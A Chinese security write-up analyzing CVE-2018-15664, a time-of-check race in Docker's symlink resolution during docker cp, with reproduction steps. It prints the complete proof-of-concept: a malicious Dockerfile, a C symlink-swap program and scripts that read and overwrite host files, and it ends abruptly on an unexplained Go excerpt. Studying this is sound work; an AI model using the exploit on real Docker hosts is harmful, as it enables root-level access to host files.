
# [原创] CVE-2018-15664：符号链接替换漏洞

## 前言

来自 SUSE 的安全专家 Aleksa Sarai 公布了编号为 CVE-2018-15664 的 Docker 相关高危安全漏洞。该漏洞的 CVSS 评分为 8.7，影响所有 Docker 18.06.0-ce-rc2 之前发行的版本。漏洞根因是使用`FollowSymlinkInScope`函数时，触发 TOCTTOU（time-of-check-to-time-of-use）文件系统竞争条件缺陷。这段函数代码在 Docker 源码中使用较多，最直接的应用就是`docker cp`命令。

根据 Sarai 的描述，`FollowSymlinkInScope`的作用是解析容器中运行进程的文件路径。攻击者可以利用路径解析校验完成后、操作执行前的空隙，将待复制文件替换为符号链接指向的目标文件。理论上，攻击者可能因此以 root 身份访问主机或其他容器内的任意文件。

## 1. 背景知识

### Docker cp 命令

`docker cp`命令用于在 Docker 创建的容器与宿主机文件系统之间复制文件或目录。例如，将文件从容器拷贝到宿主机：

```bash
docker cp container_id:file_path_in_container host_path
# 实例
docker cp 0cd4d9d94de2:/Test.java /Test.java
```

### 符号链接

符号链接（symbolic link）是 Linux 系统中的一种文件，它指向系统中的另一个文件或目录。符号链接类似于 Windows 系统中的快捷方式。符号链接的操作是透明的：对符号链接文件进行读写的程序，会表现得像是直接对目标文件进行操作。某些需要特别处理符号链接的程序（如备份程序）可能会识别并直接对其进行操作。

在 *nix 系统中，`ln`命令能够创建一个符号链接，例如：

```bash
ln -s targrt_path link_path
```

上述命令创建了一个名为`link_path`的符号链接，它指向的目标文件为`target_Path`。

### TOCTTOU

在电路设计、软件开发、系统构建中，如果一个模块的输出与多个不可控事件发生的先后时间相关，则称这种现象为“竞争条件”（Race condition），又称“竞争冒险”（race hazard）。从计算机安全角度考虑，许多竞争条件都会产生漏洞——攻击者通过访问或竞争共享资源，使利用该资源的其他参与者出现故障，导致拒绝服务、违法权限提升等后果。例如，有名的<a href="elink@2a5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6W2L8W2)9J5k6i4N6A6K9$3W2H3k6h3c8A6j5g2)9J5k6h3!0J5k6#2)9J5c8Y4N6A6K9$3W2Q4x3V1k6p5K9i4u0@1P5g2)9#2k6V1y4a6g2H3`.`.">Dirty_Cow</a>漏洞就是由竞争条件引起的。

一种常见的起因是：代码先检查某个前置条件（例如认证），然后基于这个前置条件进行某项操作；但是在检查和操作的时间间隔内，条件可能被改变。如果代码操作与安全相关，就很可能产生漏洞。这种安全问题也被称作 TOCTTOU（*time of check* and the *time of use*）。

## 2. 漏洞原理

对于 CVE-2018-15664，Docker 会将`docker cp`文件复制行为分为先后两个部分：路径检查和命令解析。当用户执行`docker cp`命令后，Docker 守护进程收到请求，首先检查用户给出的复制路径。如果路径中有容器内部的符号链接，则先在容器内部将其解析成路径字符串，之后再进行命令解析。

该流程看似没有问题，但容器内部环境是不可控的。如果 Docker 守护进程检查复制路径时，攻击者利用中间的间隙先放置一个非符号链接的常规文件或目录，那么检查结束后，攻击者可以赶在 Docker 守护进程使用该路径之前将其替换为符号链接。该符号链接在被打开时会在宿主机上解析，从而导致目录穿越。

## 3. 漏洞复现

1. 漏洞环境使用开源项目`Metarget`搭建。首先确保主机已经成功安装 Docker，然后再部署漏洞环境。

```bash
# 安装 Metarget
git clone https://github.com/brant-ruan/metarget.git
cd metarget/
pip install -r requirements.txt
# 一键部署漏洞环境
./metarget cnv install cve-2018-15664
# 完成后查看 Docker 版本
root@ubuntu:/home# docker --version
Docker version 18.03.1-ce, build 9ee9f40
```

2. 漏洞靶场搭建完毕后，使用漏洞发现者 Aleksa Sarai 提供的 PoC 验证。下载并解压 PoC 后，目录结构如下：

```text
.
├── build
│   ├── Dockerfile
│   └── symlink_swap.c
├── run_read.sh
└── run_write.sh
```

- `Dockerfile`的内容如下。它主要分为两个部分：首先生成一个容器，并在容器内编译构建漏洞利用程序`symlink_swap`，然后将其放到容器根目录下；其次，在根目录下创建一个`w00t_w00t_im_a_flag`文件，内容为`FAILED -- INSIDE CONTAINER PATH`。容器启动后执行的程序（Entrypoint）为`/symlink_swap`。

```dockerfile
# Build the binary.
FROM opensuse/leap
RUN zypper in -y gcc glibc-devel-static
RUN mkdir /builddir
COPY symlink_swap.c /builddir/symlink_swap.c
RUN gcc -Wall -Werror -static -o /builddir/symlink_swap /builddir/symlink_swap.c
# Set up our malicious rootfs.
FROM opensuse/leap
ARG SYMSWAP_TARGET=/w00t_w00t_im_a_flag
ARG SYMSWAP_PATH=/totally_safe_path
RUN echo "FAILED -- INSIDE CONTAINER PATH" >"$SYMSWAP_TARGET"
COPY --from=0 /builddir/symlink_swap /symlink_swap
ENTRYPOINT ["/symlink_swap"]
```

- `symlink_swap.c`的主要任务是在容器内创建指向根目录`/`的符号链接，并不断交换符号链接（由命令行参数传入，例如`/totally_safe_path`）与一个正常目录（例如`/totally_safe_path-stashed`）的名字。这样一来，Docker 在宿主机上执行`docker cp`时会遇到 4 种不同的场景。如果首先检测到`/totally_safe_path-stashed`是一个正常目录，但在后续执行复制操作时`/totally_safe_path`变成了符号链接，那么 Docker 就会在宿主机上解析该符号链接。

`symlink_swap.c`的内容如下：

```c
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <unistd.h>
#define usage() \
do { printf("usage: symlink_swap <symlink>\n"); exit(1); } while(0)
#define bail(msg) \
do { perror("symlink_swap: " msg); exit(1); } while (0)
/* No glibc wrapper for this, so wrap it ourselves. */
#define RENAME_EXCHANGE (1 << 1)
/*int renameat2(int olddirfd, const char *oldpath,
int newdirfd, const char *newpath, int flags)
{
return syscall(__NR_renameat2, olddirfd, oldpath, newdirfd, newpath, flags);
}*/
/* usage: symlink_swap <symlink> */
int main(int argc, char **argv)
{
if (argc != 2)
usage();
char *symlink_path = argv[1];
char *stash_path = NULL;
if (asprintf(&stash_path, "%s-stashed", symlink_path) < 0)
bail("create stash_path");
/* Create a dummy file at symlink_path. */
struct stat sb = {0};
if (!lstat(symlink_path, &sb)) {
int err;
if (sb.st_mode & S_IFDIR)
err = rmdir(symlink_path);
else
err = unlink(symlink_path);
if (err < 0)
bail("unlink symlink_path");
}
/*
* Now create a symlink to "/" (which will resolve to the host's root if we
* win the race) and a dummy directory at stash_path for us to swap with.
* We use a directory to remove the possibility of ENOTDIR which reduces
* the chance of us winning.
*/
if (symlink("/", symlink_path) < 0)
bail("create symlink_path");
if (mkdir(stash_path, 0755) < 0)
bail("mkdir stash_path");
/* Now we do a RENAME_EXCHANGE forever. */
for (;;) {
int err = renameat2(AT_FDCWD, symlink_path,
AT_FDCWD, stash_path, RENAME_EXCHANGE);
if (err < 0)
perror("symlink_swap: rename exchange failed");
}
return 0;
}
```

- `run_read.sh`模拟受害者不断使用`docker cp`命令将容器内的文件复制到宿主机上的场景。一旦漏洞触发，容器中的恶意符号链接在宿主机文件系统上解析后指向的文件，将被复制到受害者指定的宿主机目录下。

`run_read.sh`的内容如下：

```bash
SYMSWAP_PATH=/totally_safe_path
SYMSWAP_TARGET=/w00t_w00t_im_a_flag
# 创建 flag
echo "SUCCESS -- COPIED FROM THE HOST" | sudo tee "$SYMSWAP_TARGET"
sudo chmod 000 "$SYMSWAP_TARGET"
# 构建镜像并运行容器
docker build -t cyphar/symlink_swap \
--build-arg "SYMSWAP_PATH=$SYMSWAP_PATH" \
--build-arg "SYMSWAP_TARGET=$SYMSWAP_TARGET" build/
ctr_id=$(docker run --rm -d cyphar/symlink_swap "$SYMSWAP_PATH")
# 不断执行 docker cp 命令
idx=0
while true
do
mkdir "ex${idx}"
docker cp "${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET" "ex${idx}/out"
idx=$(($idx + 1))
done
```

- `run_write.sh`模拟受害者不断使用`docker cp`命令将宿主机上的文件复制到容器内的场景。一旦触发漏洞，受害者指定的宿主机文件（`localpath`）将覆盖容器内恶意符号链接在宿主机文件系统上解析后指向的文件（`w00t_w00t_im_a_flag`）。

`run_write.sh`的内容如下：

```sh
SYMSWAP_PATH=/totally_safe_path
SYMSWAP_TARGET=/w00t_w00t_im_a_flag
# 创建 flag
echo "FAILED -- HOST FILE UNCHANGED" | sudo tee "$SYMSWAP_TARGET"
sudo chmod 0444 "$SYMSWAP_TARGET"
# 构建镜像并运行容器
docker build -t cyphar/symlink_swap \
--build-arg "SYMSWAP_PATH=$SYMSWAP_PATH" \
--build-arg "SYMSWAP_TARGET=$SYMSWAP_TARGET" build/
ctr_id=$(docker run --rm -d cyphar/symlink_swap "$SYMSWAP_PATH")
echo "SUCCESS -- HOST FILE CHANGED" | tee localpath
# 不断执行 docker cp 命令
while true
do
docker cp localpath "${ctr_id}:$SYMSWAP_PATH/$SYMSWAP_TARGET"
done
```

3. 启动`run_write.sh`后，恶意容器运行，并不断执行`docker cp`命令。漏洞未触发时，宿主机上的`/w00t_w00t_im_a_flag`内容为：

```
FAILED -- HOST FILE UNCHANGED
```

如果漏洞触发，容器内的符号链接`/totally_safe_path`将在宿主机文件系统上解析。因此，`docker cp`实际上会将`localpath`文件复制到宿主机上的`/w00t_w00t_im_a_flag`位置。也就是说，此时宿主机上`/w00t_w00t_im_a_flag`的内容将被改写为：

```
SUCCESS -- HOST FILE CHANGED
```

```go
// FollowSymlinkInScope is a wrapper around evalSymlinksInScope that returns an
// absolute path. This function handles paths in a platform-agnostic manner.
func FollowSymlinkInScope(path, root string) (string, error) {
path, err := filepath.Abs(filepath.FromSlash(path))
if err != nil {
return "", err
}
root, err = filepath.Abs(filepath.FromSlash(root))
if err != nil {
return "", err
}
return evalSymlinksInScope(path, root)
}
```
